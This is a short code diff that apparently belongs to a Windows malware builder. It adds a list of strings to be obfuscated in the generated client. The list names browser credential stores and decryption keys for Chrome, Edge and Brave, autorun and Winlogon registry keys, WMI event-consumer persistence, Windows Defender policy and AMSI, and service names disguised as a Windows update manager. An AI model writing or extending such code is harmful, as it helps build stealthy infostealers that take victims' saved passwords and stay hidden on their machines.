@@ -191,6 +191,17 @@ class Manager:
         "Global\\WinSvcUpdate", "Login Data", "Local State", "os_crypt", "encrypted_key",
         "WinSvcUpdateLogon", "WinSvcUpdatePeriodic", "WinSvcUpdateStartup",
         "WinSvcUpdateIdle", "Windows Service Update Manager",
+        "cmd.exe", "powershell", "schtasks", "wscript", "Userinit", "Shell",
+        "ntdll.dll", "amsi.dll", "NtQuerySystemInformation", "SystemHandleInformation",
+        "WinSvcUpdater", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
+        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+        "SOFTWARE\\Policies\\Microsoft\\Windows Defender",
+        "__InstanceModificationEvent", "CommandLineEventConsumer",
+        "Remove-Item", "Get-WmiObject", "Win32_PerfFormattedData_PerfOS_System",
+        "LocalAppData\\Google\\Chrome\\User Data",
+        "LocalAppData\\Microsoft\\Edge\\User Data",
+        "LocalAppData\\BraveSoftware\\Brave-Browser\\User Data",
     ]
 
     def _obfuscate_client(self):
